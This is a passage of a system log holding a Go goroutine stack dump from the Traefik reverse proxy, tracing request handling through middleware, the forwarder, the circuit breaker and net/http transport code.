jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.(middleware).servehttp-fm( , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 +
jun 29 15:17:29 [localhost] traefik: net/http.handlerfunc.servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/server.go:1947 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/middlewares.negronirecoverhandler.func1( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/middlewares/recover.go:23 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.handlerfunc.servehttp( , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:24 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.middleware.servehttp( , , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.(*negroni).servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:81 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/containous/mux.(*router).servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/containous/mux/mux.go:133 +
jun 29 15:17:29 [localhost] traefik: net/http.serverhandler.servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/server.go:2694 +
jun 29 15:17:29 [localhost] traefik: net/http.(*conn).serve( , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/server.go:1830 +
jun 29 15:17:29 [localhost] traefik: created by net/http.(*server).serve
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/server.go:2795 +
jun 29 15:17:29 [localhost] traefik: goroutine 4445622 [select]:
jun 29 15:17:29 [localhost] traefik: net/http.(*persistconn).writeloop( )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1822 +
jun 29 15:17:29 [localhost] traefik: created by net/http.(*transport).dialconn
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1238 +
jun 29 15:17:29 [localhost] traefik: goroutine 4461244 [runnable]:
jun 29 15:17:29 [localhost] traefik: runtime.goexit1()
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/runtime/proc.go:2651 +
jun 29 15:17:29 [localhost] traefik: runtime.goexit()
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/runtime/asm_amd64.s:2362 +
jun 29 15:17:29 [localhost] traefik: created by net/http/httputil.(*reverseproxy).servehttp
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/httputil/reverseproxy.go:153 +
jun 29 15:17:29 [localhost] traefik: goroutine 4210882 [select]:
jun 29 15:17:29 [localhost] traefik: net/http.(*persistconn).writeloop( )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1822 +
jun 29 15:17:29 [localhost] traefik: created by net/http.(*transport).dialconn
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1238 +
jun 29 15:17:29 [localhost] traefik: goroutine 4461197 [select]:
jun 29 15:17:29 [localhost] traefik: net/http.setrequestcancel.func3( , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/client.go:323 +
jun 29 15:17:29 [localhost] traefik: created by net/http.setrequestcancel
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/client.go:322 +
jun 29 15:17:29 [localhost] traefik: goroutine 4461220 [select]:
jun 29 15:17:29 [localhost] traefik: net/http/httputil.(*reverseproxy).servehttp.func1( , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/httputil/reverseproxy.go:154 +
jun 29 15:17:29 [localhost] traefik: created by net/http/httputil.(*reverseproxy).servehttp
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/httputil/reverseproxy.go:153 +
jun 29 15:17:29 [localhost] traefik: goroutine 4454206 [chan send]:
jun 29 15:17:29 [localhost] traefik: net/http/httputil.(*maxlatencywriter).stop( )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/httputil/reverseproxy.go:362 +
jun 29 15:17:29 [localhost] traefik: net/http/httputil.(*reverseproxy).copyresponse( , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/httputil/reverseproxy.go:287 +
jun 29 15:17:29 [localhost] traefik: net/http/httputil.(*reverseproxy).servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/httputil/reverseproxy.go:237 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/vulcand/oxy/forward.(*httpforwarder).servehttp( , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/vulcand/oxy/forward/fwd.go:493 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/vulcand/oxy/forward.(*forwarder).servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/vulcand/oxy/forward/fwd.go:263 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/middlewares/accesslog.(*savebackend).servehttp.func1( )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/middlewares/accesslog/save_backend.go:26 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/middlewares/accesslog.servesavebackend( , , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/middlewares/accesslog/save_backend.go:56 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/middlewares/accesslog.(*savebackend).servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/middlewares/accesslog/save_backend.go:25 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/middlewares/accesslog.(*savefrontend).servehttp.func1()
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/middlewares/accesslog/save_frontend.go:25 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/middlewares/accesslog.servesavefrontend( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/middlewares/accesslog/save_frontend.go:50 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/middlewares/accesslog.(*savefrontend).servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/middlewares/accesslog/save_frontend.go:24 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/vulcand/oxy/roundrobin.(*rebalancer).servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/vulcand/oxy/roundrobin/rebalancer.go:195 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/middlewares.(*emptybackendhandler).servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/middlewares/empty_backend_handler.go:29 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/vulcand/oxy/cbreaker.(*circuitbreaker).serve( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/vulcand/oxy/cbreaker/cbreaker.go:161 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/vulcand/oxy/cbreaker.(*circuitbreaker).servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/vulcand/oxy/cbreaker/cbreaker.go:112 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/middlewares.(*circuitbreaker).servehttp( , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/middlewares/cbreaker.go:35 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.middleware.servehttp( , , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.(*negroni).servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:81 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/containous/mux.(*router).servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/containous/mux/mux.go:133 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/middlewares.(*handlerswitcher).servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/middlewares/handlerswitcher.go:24 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.wrap.func1( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:41 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.handlerfunc.servehttp( , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:24 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.middleware.servehttp( , , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.(middleware).servehttp-fm( , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/thoas/stats.(*stats).servehttp( , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/thoas/stats/stats.go:64 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.middleware.servehttp( , , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.(middleware).servehttp-fm( , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 +
jun 29 15:17:29 [localhost] traefik: net/http.handlerfunc.servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/server.go:1947 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/middlewares/accesslog.(*loghandler).servehttp( , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/middlewares/accesslog/logger.go:160 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.middleware.servehttp( , , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.(middleware).servehttp-fm( , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 +
jun 29 15:17:29 [localhost] traefik: net/http.handlerfunc.servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/server.go:1947 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/middlewares.negronirecoverhandler.func1( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/middlewares/recover.go:23 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.handlerfunc.servehttp( , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:24 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.middleware.servehttp( , , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.(*negroni).servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:81 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/containous/mux.(*router).servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/containous/mux/mux.go:133 +
jun 29 15:17:29 [localhost] traefik: net/http.serverhandler.servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/server.go:2694 +
jun 29 15:17:29 [localhost] traefik: net/http.(*conn).serve( , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/server.go:1830 +
jun 29 15:17:29 [localhost] traefik: created by net/http.(*server).serve
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/server.go:2795 +
jun 29 15:17:29 [localhost] traefik: goroutine 4436567 [select]:
jun 29 15:17:29 [localhost] traefik: net/http.(*persistconn).roundtrip( , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:2033 +
jun 29 15:17:29 [localhost] traefik: net/http.(*transport).roundtrip( , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:422 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/vulcand/oxy/forward.errorhandlingroundtripper.roundtrip( , , , , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/vulcand/oxy/forward/fwd.go:150 +
jun 29 15:17:29 [localhost] traefik: net/http/httputil.(*reverseproxy).servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/httputil/reverseproxy.go:193 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/vulcand/oxy/forward.(*httpforwarder).servehttp( , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/vulcand/oxy/forward/fwd.go:493 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/vulcand/oxy/forward.(*forwarder).servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/vulcand/oxy/forward/fwd.go:263 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/middlewares/accesslog.(*savebackend).servehttp.func1( )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/middlewares/accesslog/save_backend.go:26 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/middlewares/accesslog.servesavebackend( , , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/middlewares/accesslog/save_backend.go:56 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/middlewares/accesslog.(*savebackend).servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/middlewares/accesslog/save_backend.go:25 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/middlewares/accesslog.(*savefrontend).servehttp.func1()
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/middlewares/accesslog/save_frontend.go:25 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/middlewares/accesslog.servesavefrontend( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/middlewares/accesslog/save_frontend.go:50 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/middlewares/accesslog.(*savefrontend).servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/middlewares/accesslog/save_frontend.go:24 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/vulcand/oxy/roundrobin.(*roundrobin).servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/vulcand/oxy/roundrobin/rr.go:129 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/middlewares.(*emptybackendhandler).servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/middlewares/empty_backend_handler.go:29 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.wrap.func1( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:41 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.handlerfunc.servehttp( , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:24 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.middleware.servehttp( , , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.(*negroni).servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:81 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/containous/mux.(*router).servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/containous/mux/mux.go:133 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/middlewares.(*handlerswitcher).servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/middlewares/handlerswitcher.go:24 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.wrap.func1( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:41 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.handlerfunc.servehttp( , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:24 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.middleware.servehttp( , , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.(middleware).servehttp-fm( , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/thoas/stats.(*stats).servehttp( , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/thoas/stats/stats.go:64 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.middleware.servehttp( , , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.(middleware).servehttp-fm( , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 +
jun 29 15:17:29 [localhost] traefik: net/http.handlerfunc.servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/server.go:1947 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/middlewares/accesslog.(*loghandler).servehttp( , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/middlewares/accesslog/logger.go:160 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.middleware.servehttp( , , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.(middleware).servehttp-fm( , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 +
jun 29 15:17:29 [localhost] traefik: net/http.handlerfunc.servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/server.go:1947 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/middlewares.negronirecoverhandler.func1( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/middlewares/recover.go:23 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.handlerfunc.servehttp( , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:24 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.middleware.servehttp( , , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.(*negroni).servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:81 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/containous/mux.(*router).servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/containous/mux/mux.go:133 +
jun 29 15:17:29 [localhost] traefik: net/http.serverhandler.servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/server.go:2694 +
jun 29 15:17:29 [localhost] traefik: net/http.(*conn).serve( , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/server.go:1830 +
jun 29 15:17:29 [localhost] traefik: created by net/http.(*server).serve
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/server.go:2795 +
jun 29 15:17:29 [localhost] traefik: goroutine 4461097 [select]:
jun 29 15:17:29 [localhost] traefik: net/http.setrequestcancel.func3( , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/client.go:323 +
jun 29 15:17:29 [localhost] traefik: created by net/http.setrequestcancel
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/client.go:322 +
jun 29 15:17:29 [localhost] traefik: goroutine 4406348 [io wait]:
jun 29 15:17:29 [localhost] traefik: internal/poll.runtime_pollwait( , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/runtime/netpoll.go:173 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*polldesc).wait( , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_poll_runtime.go:85 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*polldesc).waitread( , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_poll_runtime.go:90 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*fd).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_unix.go:157 +
jun 29 15:17:29 [localhost] traefik: net.(*netfd).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/fd_unix.go:202 +
jun 29 15:17:29 [localhost] traefik: net.(*conn).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/net.go:176 +
jun 29 15:17:29 [localhost] traefik: net/http.(*persistconn).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1453 +
jun 29 15:17:29 [localhost] traefik: bufio.(*reader).fill( )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/bufio/bufio.go:100 +
jun 29 15:17:29 [localhost] traefik: bufio.(*reader).peek( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/bufio/bufio.go:132 +
jun 29 15:17:29 [localhost] traefik: net/http.(*persistconn).readloop( )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1601 +
jun 29 15:17:29 [localhost] traefik: created by net/http.(*transport).dialconn
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1237 +
jun 29 15:17:29 [localhost] traefik: goroutine 4438496 [io wait]:
jun 29 15:17:29 [localhost] traefik: internal/poll.runtime_pollwait( , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/runtime/netpoll.go:173 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*polldesc).wait( , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_poll_runtime.go:85 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*polldesc).waitread( , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_poll_runtime.go:90 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*fd).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_unix.go:157 +
jun 29 15:17:29 [localhost] traefik: net.(*netfd).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/fd_unix.go:202 +
jun 29 15:17:29 [localhost] traefik: net.(*conn).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/net.go:176 +
jun 29 15:17:29 [localhost] traefik: net/http.(*persistconn).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1453 +
jun 29 15:17:29 [localhost] traefik: bufio.(*reader).fill( )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/bufio/bufio.go:100 +
jun 29 15:17:29 [localhost] traefik: bufio.(*reader).peek( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/bufio/bufio.go:132 +
jun 29 15:17:29 [localhost] traefik: net/http.(*persistconn).readloop( )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1601 +
jun 29 15:17:29 [localhost] traefik: created by net/http.(*transport).dialconn
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1237 +
jun 29 15:17:29 [localhost] traefik: goroutine 4461028 [select]:
jun 29 15:17:29 [localhost] traefik: net/http.setrequestcancel.func3( , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/client.go:323 +
jun 29 15:17:29 [localhost] traefik: created by net/http.setrequestcancel
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/client.go:322 +
jun 29 15:17:29 [localhost] traefik: goroutine 4445610 [select]:
jun 29 15:17:29 [localhost] traefik: net/http.(*persistconn).roundtrip( , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:2033 +
jun 29 15:17:29 [localhost] traefik: net/http.(*transport).roundtrip( , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:422 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/vulcand/oxy/forward.errorhandlingroundtripper.roundtrip( , , , , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/vulcand/oxy/forward/fwd.go:150 +
jun 29 15:17:29 [localhost] traefik: net/http/httputil.(*reverseproxy).servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/httputil/reverseproxy.go:193 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/vulcand/oxy/forward.(*httpforwarder).servehttp( , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/vulcand/oxy/forward/fwd.go:493 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/vulcand/oxy/forward.(*forwarder).servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/vulcand/oxy/forward/fwd.go:263 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/middlewares/accesslog.(*savebackend).servehttp.func1( )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/middlewares/accesslog/save_backend.go:26 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/middlewares/accesslog.servesavebackend( , , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/middlewares/accesslog/save_backend.go:56 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/middlewares/accesslog.(*savebackend).servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/middlewares/accesslog/save_backend.go:25 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/middlewares/accesslog.(*savefrontend).servehttp.func1()
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/middlewares/accesslog/save_frontend.go:25 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/middlewares/accesslog.servesavefrontend( , , , )
